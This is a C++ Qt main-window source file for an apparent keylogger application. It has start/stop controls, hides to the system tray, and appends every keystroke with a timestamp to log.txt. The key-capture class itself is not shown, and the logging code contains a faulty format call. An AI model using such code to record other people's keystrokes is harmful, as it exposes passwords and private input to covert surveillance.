#include <iostream>
#include "mainwindow.h"
#include "./ui_mainwindow.h"
#include <conio.h>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow),
    logger(nullptr)
{
    ui->setupUi(this);
    logger = new Logger();
    connect(logger, &Logger::keyPressed, this, &MainWindow::handleKeyPress);
    connect(logger, &Logger::stopLogging, logger, &Logger::stopLoggingThread);

    createTrayIcon();
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::on_bntStart_clicked()
{
    if (!logger->isRunning()) {
        logger->start();
    }
}

void MainWindow::on_btnStop_clicked()
{
    if (logger->isRunning()) {
        emit logger->stopLogging();
    }
}

void MainWindow::on_pushButton_clicked()
{
    QString filePath = "log.txt"; // Path to the log file in the same directory
    QFile file(filePath);

    if (!file.exists()) {
        QMessageBox::warning(this, "File Not Found", "The log file does not exist. Start logging first.");
        return;
    }

    if (!QDesktopServices::openUrl(QUrl::fromLocalFile(filePath))) {
        QMessageBox::critical(this, "Error", "Failed to open the log file.");
    }
}

void MainWindow::closeEvent(QCloseEvent *event)
{
    if (m_trayIcon->isVisible()) {
        hide();
        event->ignore();
    } else {
        QMainWindow::closeEvent(event);
    }
}

void MainWindow::createTrayIcon()
{
    QString iconPath = ":/icon.png";
    QIcon icon(iconPath);
    m_trayIcon = new QSystemTrayIcon(icon, this);
    connect(m_trayIcon, &QSystemTrayIcon::activated, this, &MainWindow::trayIconActivated);

    QString appName = QCoreApplication::applicationName();
    m_trayIconMenu = new QMenu(this);

    QAction *sectionAction = new QAction(QIcon(icon), appName, this);
    sectionAction->setDisabled(true);
    // Insert the section action at the beginning of the system tray icon menu
    m_trayIconMenu->insertAction(nullptr, sectionAction);

     m_trayIconMenu->addSeparator();

    QAction *restoreAction = new QAction(tr("Open"), this);
    connect(restoreAction, &QAction::triggered, this, &MainWindow::showNormal);
    m_trayIconMenu->addAction(restoreAction);

    QAction *quitAction = new QAction(tr("Quit"), this);
    connect(quitAction, &QAction::triggered, qApp, &QApplication::quit);
    m_trayIconMenu->addAction(quitAction);

    m_trayIcon->setContextMenu(m_trayIconMenu);
    m_trayIcon->show();

}

void MainWindow::trayIconActivated(QSystemTrayIcon::ActivationReason reason)
{
    if( reason )
    {
        if( reason != QSystemTrayIcon::DoubleClick )
            return;
    }

    if( isVisible() )
    {
        hide();
    }
    else
    {
        show();
        raise();
        setFocus();
    }
        std::cout << "created tray" << std::endl;
}

void MainWindow::handleKeyPress(char key)
{
    Save(key, "log.txt");
}

const char* MainWindow::GetTimestamp() {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    static char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%d-%m-%Y %H:%M:%S", t);
    return timestamp;
}

int MainWindow::Save(int _key, const char *file) {
    std::cout<< _key << std::endl;
    Sleep(10);
    FILE *OUTPUT_FILE; // can also use the ofstream command
    OUTPUT_FILE = fopen(file, "a+"); //a+ is used to add new keys each time, and not overwrite
    fprintf(OUTPUT_FILE, "[%s] ", GetTimestamp());
    switch(_key)
    {
    case VK_SHIFT: fprintf(OUTPUT_FILE, "(SHIFT)");
        break;
    case VK_BACK: fprintf(OUTPUT_FILE, "(BACKSPACE)");
        break;
    case VK_LBUTTON: fprintf(OUTPUT_FILE, "(LBUTTON)");
        break;
    case VK_RBUTTON: fprintf(OUTPUT_FILE, "(RBUTTON)");
        break;
    case VK_RETURN: fprintf(OUTPUT_FILE, "(ENTER)");
        break;
    case VK_TAB: fprintf(OUTPUT_FILE, "(TAB)");
        break;
    case VK_ESCAPE: fprintf(OUTPUT_FILE, "(ESCAPE)");
        break;
    case VK_CONTROL: fprintf(OUTPUT_FILE, "(Ctrl)");
        break;
    case VK_MENU: fprintf(OUTPUT_FILE, "(Alt)");
        break;
    case VK_CAPITAL: fprintf(OUTPUT_FILE, "(CAPS Lock)");
        break;
    case VK_SPACE: fprintf(OUTPUT_FILE, "(SPACE)");
        break;
    }
    fprintf(OUTPUT_FILE, "%s\n", &_key);
    fclose(OUTPUT_FILE);
    return 0;
}
